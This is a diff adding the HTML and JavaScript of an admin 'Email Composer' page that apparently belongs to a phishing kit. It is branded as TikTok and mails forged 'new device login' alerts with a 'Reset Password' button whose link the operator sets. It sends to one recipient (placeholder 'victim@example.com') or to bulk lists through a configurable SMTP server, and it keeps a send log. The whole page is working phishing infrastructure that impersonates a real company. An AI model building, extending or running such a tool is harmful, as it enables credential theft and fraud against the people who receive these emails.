@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Composer — Admin</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #0a0a0f;
+      --surface: #13131f;
+      --surface-2: #1a1a2e;
+      --surface-3: #22223a;
+      --border: rgba(255,255,255,0.07);
+      --border-focus: rgba(254,44,85,0.5);
+      --text: #e2e8f0;
+      --text-dim: #64748b;
+      --text-muted: #475569;
+      --accent: #fe2c55;
+      --accent-hover: #ff4d73;
+      --success: #10b981;
+      --error: #ef4444;
+      --warning: #f59e0b;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    /* ── TOP BAR ─────────────────────────────── */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 32px;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(20px);
+    }
+
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .topbar-logo {
+      font-size: 20px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #fe2c55, #25f4ee);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .topbar-divider {
+      width: 1px;
+      height: 24px;
+      background: var(--border);
+    }
+
+    .topbar-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-dim);
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .topbar-btn {
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid var(--border);
+      background: transparent;
+      color: var(--text-dim);
+      transition: all 0.2s;
+      text-decoration: none;
+    }
+
+    .topbar-btn:hover {
+      background: var(--surface-2);
+      color: var(--text);
+    }
+
+    /* ── LAYOUT ──────────────────────────────── */
+    .layout {
+      display: grid;
+      grid-template-columns: 340px 1fr;
+      min-height: calc(100vh - 57px);
+    }
+
+    /* ── SIDEBAR ─────────────────────────────── */
+    .sidebar {
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      padding: 24px;
+      overflow-y: auto;
+    }
+
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-label::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* ── FORM ELEMENTS ───────────────────────── */
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-dim);
+      margin-bottom: 6px;
+      letter-spacing: 0.3px;
+    }
+
+    .form-group input,
+    .form-group select,
+    .form-group textarea {
+      width: 100%;
+      padding: 10px 14px;
+      background: var(--surface-2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      color: var(--text);
+      font-size: 13px;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.2s;
+      outline: none;
+    }
+
+    .form-group input:focus,
+    .form-group select:focus,
+    .form-group textarea:focus {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 0 3px rgba(254,44,85,0.1);
+    }
+
+    .form-group input::placeholder,
+    .form-group textarea::placeholder {
+      color: var(--text-muted);
+    }
+
+    .form-group textarea {
+      min-height: 80px;
+      resize: vertical;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .form-row-3 {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 12px;
+    }
+
+    /* ── BUTTONS ──────────────────────────────── */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 11px 20px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+      width: 100%;
+    }
+
+    .btn-primary {
+      background: var(--accent);
+      color: #fff;
+    }
+
+    .btn-primary:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 20px rgba(254,44,85,0.3);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .btn-secondary {
+      background: var(--surface-3);
+      color: var(--text);
+      border: 1px solid var(--border);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(255,255,255,0.08);
+    }
+
+    .btn-success {
+      background: var(--success);
+      color: #fff;
+    }
+
+    .btn-success:hover {
+      background: #0da875;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 8px;
+    }
+
+    /* ── STATUS INDICATOR ────────────────────── */
+    .status-bar {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 18px;
+      animation: slideDown 0.3s ease;
+    }
+
+    .status-bar.visible { display: flex; }
+    .status-bar.success { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); color: var(--success); }
+    .status-bar.error { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); color: var(--error); }
+    .status-bar.loading { background: rgba(254,44,85,0.1); border: 1px solid rgba(254,44,85,0.3); color: var(--accent); }
+
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .status-bar.success .status-dot { background: var(--success); }
+    .status-bar.error .status-dot { background: var(--error); }
+    .status-bar.loading .status-dot { background: var(--accent); animation: pulse 1s infinite; }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    /* ── MAIN AREA (preview) ─────────────────── */
+    .main-area {
+      padding: 24px;
+      overflow-y: auto;
+      background: var(--bg);
+    }
+
+    .preview-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .preview-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-muted);
+    }
+
+    .preview-frame {
+      background: #ffffff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.3);
+      border: 1px solid var(--border);
+      min-height: 500px;
+    }
+
+    .preview-frame iframe {
+      width: 100%;
+      height: 700px;
+      border: none;
+      background: #fff;
+    }
+
+    /* ── SMTP CONFIG PANEL ────────────────────── */
+    .config-panel {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(8px);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .config-panel.open { display: flex; }
+
+    .config-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 32px;
+      width: 480px;
+      max-height: 90vh;
+      overflow-y: auto;
+      animation: slideDown 0.3s ease;
+    }
+
+    .config-card h2 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .config-card .config-sub {
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 24px;
+    }
+
+    .config-close {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      color: var(--text-dim);
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    /* ── SEND LOG TABLE ───────────────────────── */
+    .log-panel {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(8px);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .log-panel.open { display: flex; }
+
+    .log-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 32px;
+      width: 700px;
+      max-height: 80vh;
+      overflow-y: auto;
+      animation: slideDown 0.3s ease;
+    }
+
+    .log-card h2 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+
+    .log-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 12px;
+    }
+
+    .log-table th {
+      text-align: left;
+      padding: 10px 12px;
+      background: var(--surface-2);
+      color: var(--text-dim);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .log-table td {
+      padding: 10px 12px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+    }
+
+    .log-badge {
+      display: inline-block;
+      padding: 3px 10px;
+      border-radius: 50px;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .log-badge.sent { background: rgba(16,185,129,0.15); color: var(--success); }
+    .log-badge.failed { background: rgba(239,68,68,0.15); color: var(--error); }
+
+    .empty-state {
+      text-align: center;
+      padding: 40px;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    /* ── RESPONSIVE ──────────────────────────── */
+    @media (max-width: 800px) {
+      .layout { grid-template-columns: 1fr; }
+      .main-area { display: none; }
+      .topbar { padding: 12px 16px; }
+      .sidebar { padding: 16px; }
+    }
+
+    /* ── SPINNER ──────────────────────────────── */
+    .spinner {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ── BULK TEXTAREA ───────────────────────── */
+    .bulk-info {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 4px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ═══════ TOP BAR ═══════ -->
+  <div class="topbar">
+    <div class="topbar-left">
+      <span class="topbar-logo">TikTok</span>
+      <div class="topbar-divider"></div>
+      <span class="topbar-title">Email Composer</span>
+    </div>
+    <div class="topbar-right">
+      <button class="topbar-btn" onclick="openLogs()">📋 Send History</button>
+      <button class="topbar-btn" onclick="openConfig()">⚙️ SMTP Config</button>
+      <a href="/admin" class="topbar-btn">← Dashboard</a>
+    </div>
+  </div>
+
+  <!-- ═══════ MAIN LAYOUT ═══════ -->
+  <div class="layout">
+
+    <!-- ─── SIDEBAR: COMPOSE FORM ─── -->
+    <div class="sidebar">
+
+      <div id="statusBar" class="status-bar">
+        <div class="status-dot"></div>
+        <span id="statusText"></span>
+      </div>
+
+      <!-- MODE TOGGLE -->
+      <div class="form-group">
+        <label>Send Mode</label>
+        <select id="sendMode" onchange="toggleMode()">
+          <option value="single">Single Email</option>
+          <option value="bulk">Bulk Send</option>
+        </select>
+      </div>
+
+      <!-- SINGLE MODE FIELDS -->
+      <div id="singleFields">
+        <span class="section-label">Recipient</span>
+
+        <div class="form-group">
+          <label>Email Address *</label>
+          <input type="email" id="toEmail" placeholder="victim@example.com">
+        </div>
+
+        <div class="form-group">
+          <label>Recipient Name</label>
+          <input type="text" id="recipientName" placeholder="bevan • following" value="bevan • following">
+        </div>
+      </div>
+
+      <!-- BULK MODE FIELDS -->
+      <div id="bulkFields" style="display:none;">
+        <span class="section-label">Recipients (Bulk)</span>
+
+        <div class="form-group">
+          <label>Email List</label>
+          <textarea id="bulkEmails" rows="5" placeholder="email1@example.com&#10;email2@example.com&#10;email3@example.com"></textarea>
+          <div class="bulk-info">One email per line. All will receive the same template with the details below.</div>
+        </div>
+      </div>
+
+      <span class="section-label">Alert Details</span>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Login Date</label>
+          <input type="text" id="loginDate" placeholder="04/15" value="04/15">
+        </div>
+        <div class="form-group">
+          <label>Login Time</label>
+          <input type="text" id="loginTime" placeholder="14:19" value="14:19">
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Timezone</label>
+          <input type="text" id="timezone" placeholder="SAST" value="SAST">
+        </div>
+        <div class="form-group">
+          <label>Device</label>
+          <input type="text" id="device" placeholder="iPhone 12" value="iPhone 12">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Location</label>
+        <input type="text" id="location" placeholder="Gauteng" value="Gauteng">
+      </div>
+
+      <span class="section-label">Email Customization</span>
+
+      <div class="form-group">
+        <label>Sender Name (Logo Text)</label>
+        <input type="text" id="senderName" placeholder="TikTok" value="TikTok">
+      </div>
+
+      <div class="form-group">
+        <label>Subject Line</label>
+        <input type="text" id="subjectLine" placeholder="New device login to your TikTok account" value="New device login to your TikTok account">
+      </div>
+
+      <div class="form-group">
+        <label>Greeting Text (use {name} for recipient name)</label>
+        <input type="text" id="greetingText" placeholder="Hi {name}," value="Hi {name},">
+      </div>
+
+      <div class="form-group">
+        <label>Body Text</label>
+        <textarea id="bodyText" rows="3">We're writing to inform you that we detected a login to your account from a new device.</textarea>
+      </div>
+
+      <div class="form-group">
+        <label>Instruction 1</label>
+        <textarea id="instructionText1" rows="2">If this was you, you can ignore this message.</textarea>
+      </div>
+
+      <div class="form-group">
+        <label>Instruction 2</label>
+        <textarea id="instructionText2" rows="3">If this wasn&rsquo;t you, open the TikTok app and go to &ldquo;Settings and privacy&rdquo; &gt; &ldquo;Security and login&rdquo; &gt; &ldquo;Security alerts&rdquo; and review unauthorized logins.</textarea>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Button Text</label>
+          <input type="text" id="buttonText" placeholder="Reset Password" value="Reset Password">
+        </div>
+        <div class="form-group">
+          <label>Button Link</label>
+          <input type="text" id="buttonLink" placeholder="/" value="/">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Footer Text</label>
+        <textarea id="footerText" rows="2">This is an automatically generated email.<br>Replies to this email address aren&rsquo;t monitored.</textarea>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn btn-secondary" onclick="previewEmail()" style="flex:1;">👁 Preview</button>
+        <button class="btn btn-primary" id="sendBtn" onclick="sendEmail()" style="flex:1;">✉ Send Email</button>
+      </div>
+      
+      <div class="btn-row" style="margin-top: 10px;">
+        <button class="btn btn-secondary" onclick="resetToDefault()" style="flex:1;">🔄 Reset to Default</button>
+      </div>
+    </div>
+
+    <!-- ─── MAIN: PREVIEW ─── -->
+    <div class="main-area">
+      <div class="preview-header">
+        <span class="preview-label">📧 Email Preview</span>
+        <span style="font-size:11px; color:var(--text-muted);">Live preview of outgoing email</span>
+      </div>
+      <div class="preview-frame">
+        <iframe id="previewFrame"></iframe>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ═══════ SMTP CONFIG MODAL ═══════ -->
+  <div id="configPanel" class="config-panel" onclick="if(event.target===this) closeConfig()">
+    <div class="config-card">
+      <h2>⚙️ SMTP Configuration</h2>
+      <p class="config-sub">Configure your outgoing mail server settings.</p>
+
+      <div id="configStatus" class="status-bar" style="margin-bottom:20px;"></div>
+
+      <div class="form-group">
+        <label>SMTP Host</label>
+        <input type="text" id="cfgHost" placeholder="smtp.gmail.com">
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Port</label>
+          <input type="number" id="cfgPort" placeholder="587">
+        </div>
+        <div class="form-group">
+          <label>Security</label>
+          <select id="cfgSecure">
+            <option value="false">STARTTLS (587)</option>
+            <option value="true">SSL (465)</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Username / Email</label>
+        <input type="text" id="cfgUser" placeholder="your-email@gmail.com">
+      </div>
+
+      <div class="form-group">
+        <label>Password / App Password</label>
+        <input type="password" id="cfgPass" placeholder="••••••••••••">
+      </div>
+
+      <div class="btn-row" style="margin-top:20px;">
+        <button class="btn btn-secondary" onclick="testConnection()" style="flex:1;">🔌 Test Connection</button>
+        <button class="btn btn-primary" onclick="saveConfig()" style="flex:1;">💾 Save Config</button>
+      </div>
+
+      <div style="margin-top:16px;">
+        <button class="btn btn-secondary" onclick="closeConfig()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════ SEND LOG MODAL ═══════ -->
+  <div id="logPanel" class="log-panel" onclick="if(event.target===this) closeLogs()">
+    <div class="log-card">
+      <h2>📋 Send History</h2>
+      <div id="logContent"></div>
+      <div class="btn-row" style="margin-top:20px;">
+        <button class="btn btn-secondary" onclick="clearLogs()" style="flex:1;">🗑 Clear Logs</button>
+        <button class="btn btn-secondary" onclick="closeLogs()" style="flex:1;">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ── Auth ──────────────────────────────────────────────────
+    const TOKEN_KEY = 'adminToken';
+    const TOKEN = sessionStorage.getItem(TOKEN_KEY);
+
+    async function checkAuth() {
+      if (!TOKEN) { window.location.href = '/admin/login'; return; }
+      try {
+        const res = await fetch('/api/admin/verify', { headers: { 'Authorization': 'Bearer ' + TOKEN } });
+        if (!res.ok) { sessionStorage.removeItem(TOKEN_KEY); window.location.href = '/admin/login'; }
+      } catch(e) { sessionStorage.removeItem(TOKEN_KEY); window.location.href = '/admin/login'; }
+    }
+    checkAuth();
+
+    function authHeaders() {
+      return { 'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json' };
+    }
+
+    // ── Status Helpers ───────────────────────────────────────
+    function showStatus(type, message) {
+      const bar = document.getElementById('statusBar');
+      const text = document.getElementById('statusText');
+      bar.className = 'status-bar visible ' + type;
+      text.textContent = message;
+      if (type !== 'loading') setTimeout(() => bar.classList.remove('visible'), 5000);
+    }
+
+    function showConfigStatus(type, message) {
+      const bar = document.getElementById('configStatus');
+      bar.className = 'status-bar visible ' + type;
+      bar.innerHTML = '<div class="status-dot"></div><span>' + message + '</span>';
+      if (type !== 'loading') setTimeout(() => bar.classList.remove('visible'), 5000);
+    }
+
+    // ── Mode Toggle ──────────────────────────────────────────
+    function toggleMode() {
+      const mode = document.getElementById('sendMode').value;
+      document.getElementById('singleFields').style.display = mode === 'single' ? 'block' : 'none';
+      document.getElementById('bulkFields').style.display = mode === 'bulk' ? 'block' : 'none';
+      document.getElementById('sendBtn').textContent = mode === 'bulk' ? '✉ Send Bulk' : '✉ Send Email';
+    }
+
+    // ── Reset to Default ─────────────────────────────────────
+    function resetToDefault() {
+      document.getElementById('senderName').value = 'TikTok';
+      document.getElementById('subjectLine').value = 'New device login to your TikTok account';
+      document.getElementById('greetingText').value = 'Hi {name},';
+      document.getElementById('bodyText').value = "We're writing to inform you that we detected a login to your account from a new device.";
+      document.getElementById('instructionText1').value = 'If this was you, you can ignore this message.';
+      document.getElementById('instructionText2').value = "If this wasn&rsquo;t you, open the TikTok app and go to &ldquo;Settings and privacy&rdquo; &gt; &ldquo;Security and login&rdquo; &gt; &ldquo;Security alerts&rdquo; and review unauthorized logins.";
+      document.getElementById('buttonText').value = 'Reset Password';
+      document.getElementById('buttonLink').value = '/';
+      document.getElementById('footerText').value = 'This is an automatically generated email.<br>Replies to this email address aren&rsquo;t monitored.';
+      showStatus('success', 'Reset to default template');
+      previewEmail();
+    }
+
+    // ── Gather form data ─────────────────────────────────────
+    function getFormData() {
+      return {
+        recipientName: document.getElementById('recipientName').value,
+        loginDate: document.getElementById('loginDate').value,
+        loginTime: document.getElementById('loginTime').value,
+        timezone: document.getElementById('timezone').value,
+        device: document.getElementById('device').value,
+        location: document.getElementById('location').value,
+        senderName: document.getElementById('senderName').value,
+        subjectLine: document.getElementById('subjectLine').value,
+        greetingText: document.getElementById('greetingText').value,
+        bodyText: document.getElementById('bodyText').value,
+        instructionText1: document.getElementById('instructionText1').value,
+        instructionText2: document.getElementById('instructionText2').value,
+        buttonText: document.getElementById('buttonText').value,
+        buttonLink: document.getElementById('buttonLink').value,
+        footerText: document.getElementById('footerText').value,
+      };
+    }
+
+    // ── Preview ──────────────────────────────────────────────
+    async function previewEmail() {
+      const data = getFormData();
+      try {
+        const resp = await fetch('/api/email/preview', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(data),
+        });
+        const json = await resp.json();
+        const iframe = document.getElementById('previewFrame');
+        iframe.srcdoc = json.html;
+        showStatus('success', 'Preview updated');
+      } catch (err) {
+        showStatus('error', 'Preview failed: ' + err.message);
+      }
+    }
+
+    // ── Send Email ───────────────────────────────────────────
+    async function sendEmail() {
+      const mode = document.getElementById('sendMode').value;
+      const btn = document.getElementById('sendBtn');
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> Sending...';
+
+      try {
+        if (mode === 'single') {
+          const to = document.getElementById('toEmail').value.trim();
+          if (!to) { showStatus('error', 'Enter a recipient email'); btn.disabled = false; btn.textContent = '✉ Send Email'; return; }
+
+          const data = { to, ...getFormData() };
+          const resp = await fetch('/api/email/send', {
+            method: 'POST',
+            headers: authHeaders(),
+            body: JSON.stringify(data),
+          });
+          const json = await resp.json();
+
+          if (json.success) {
+            showStatus('success', '✅ Email sent successfully! ID: ' + (json.messageId || 'N/A'));
+          } else {
+            showStatus('error', '❌ Failed: ' + (json.error || 'Unknown error'));
+          }
+        } else {
+          // Bulk mode
+          const emails = document.getElementById('bulkEmails').value.trim().split('\n').filter(e => e.trim());
+          if (emails.length === 0) { showStatus('error', 'Enter at least one email'); btn.disabled = false; btn.textContent = '✉ Send Bulk'; return; }
+
+          const recipients = emails.map(e => ({ to: e.trim() }));
+          const templateData = getFormData();
+
+          showStatus('loading', `Sending to ${recipients.length} recipients...`);
+
+          const resp = await fetch('/api/email/bulk', {
+            method: 'POST',
+            headers: authHeaders(),
+            body: JSON.stringify({ recipients, templateData, delayMs: 1500 }),
+          });
+          const json = await resp.json();
+
+          const sent = json.results.filter(r => r.success).length;
+          const failed = json.results.filter(r => !r.success).length;
+          showStatus(failed === 0 ? 'success' : 'error', `✅ ${sent} sent, ❌ ${failed} failed`);
+        }
+      } catch (err) {
+        showStatus('error', '❌ Network error: ' + err.message);
+      }
+
+      btn.disabled = false;
+      btn.textContent = mode === 'bulk' ? '✉ Send Bulk' : '✉ Send Email';
+    }
+
+    // ── SMTP Config ──────────────────────────────────────────
+    function openConfig() { document.getElementById('configPanel').classList.add('open'); loadConfig(); }
+    function closeConfig() { document.getElementById('configPanel').classList.remove('open'); }
+
+    async function loadConfig() {
+      try {
+        const resp = await fetch('/api/email/config', { headers: authHeaders() });
+        const cfg = await resp.json();
+        document.getElementById('cfgHost').value = cfg.host || '';
+        document.getElementById('cfgPort').value = cfg.port || 587;
+        document.getElementById('cfgSecure').value = cfg.secure ? 'true' : 'false';
+        document.getElementById('cfgUser').value = cfg.user || '';
+      } catch (err) {}
+    }
+
+    async function saveConfig() {
+      const config = {
+        host: document.getElementById('cfgHost').value,
+        port: document.getElementById('cfgPort').value,
+        secure: document.getElementById('cfgSecure').value === 'true',
+        user: document.getElementById('cfgUser').value,
+        pass: document.getElementById('cfgPass').value,
+      };
+      try {
+        const resp = await fetch('/api/email/config', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(config),
+        });
+        const json = await resp.json();
+        showConfigStatus('success', 'Configuration saved!');
+      } catch (err) {
+        showConfigStatus('error', 'Failed to save: ' + err.message);
+      }
+    }
+
+    async function testConnection() {
+      showConfigStatus('loading', 'Testing connection...');
+      try {
+        const resp = await fetch('/api/email/verify', { method: 'POST', headers: authHeaders() });
+        const json = await resp.json();
+        showConfigStatus(json.success ? 'success' : 'error', json.message);
+      } catch (err) {
+        showConfigStatus('error', 'Test failed: ' + err.message);
+      }
+    }
+
+    // ── Send Logs ────────────────────────────────────────────
+    function openLogs() { document.getElementById('logPanel').classList.add('open'); loadLogs(); }
+    function closeLogs() { document.getElementById('logPanel').classList.remove('open'); }
+
+    async function loadLogs() {
+      try {
+        const resp = await fetch('/api/email/logs', { headers: authHeaders() });
+        const logs = await resp.json();
+        const container = document.getElementById('logContent');
+
+        if (logs.length === 0) {
+          container.innerHTML = '<div class="empty-state">No emails sent yet.</div>';
+          return;
+        }
+
+        let html = '<table class="log-table"><thead><tr><th>To</th><th>Status</th><th>Message ID</th><th>Time</th></tr></thead><tbody>';
+        logs.reverse().forEach(log => {
+          const badge = log.success
+            ? '<span class="log-badge sent">Sent</span>'
+            : '<span class="log-badge failed">Failed</span>';
+          const time = new Date(log.timestamp).toLocaleString();
+          const msgId = log.messageId ? log.messageId.substring(0, 20) + '...' : (log.error || '—');
+          html += `<tr><td>${log.to}</td><td>${badge}</td><td style="font-size:11px;color:var(--text-muted)">${msgId}</td><td style="font-size:11px;color:var(--text-muted)">${time}</td></tr>`;
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+      } catch (err) {
+        document.getElementById('logContent').innerHTML = '<div class="empty-state">Failed to load logs.</div>';
+      }
+    }
+
+    async function clearLogs() {
+      if (!confirm('Clear all send history?')) return;
+      await fetch('/api/email/logs', { method: 'DELETE', headers: authHeaders() });
+      loadLogs();
+    }
+
+    // ── Initial preview ──────────────────────────────────────
+    previewEmail();
+  </script>
+</body>
+</html>
